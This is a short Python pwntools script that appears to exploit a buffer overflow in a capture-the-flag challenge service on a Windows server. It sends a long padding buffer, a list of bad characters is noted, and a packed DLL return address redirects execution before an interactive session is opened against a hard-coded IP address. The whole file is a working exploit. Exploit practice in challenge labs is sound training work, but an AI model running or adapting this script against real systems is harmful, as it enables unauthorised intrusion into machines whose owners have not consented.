from pwn import *
from time import sleep

p = remote('18.237.80.238', 7777)
#p = remote('[IP address redacted]', 7777) # Windows Server 2019 on AWS, t2.medium

p.recvuntil(b"> ")


payload = b"A"*500
payload += b"B"*4
payload += b"C"*4
payload += b"D"*4
#payload += b"E"*4

# Bad chars: \x03\x04\x0a\x0d\x0f\x11\x12\x13\x15\x17\x1a\x1c\x7f
# So the DLL address I jump to must not have any of these!
# We wrote the challenge so that this is so. (Added a 'pontificate' function ^_^)
payload += p32(0x62101661)
payload += b"\n"
#sleep(20)
p.send(payload)

p.interactive()
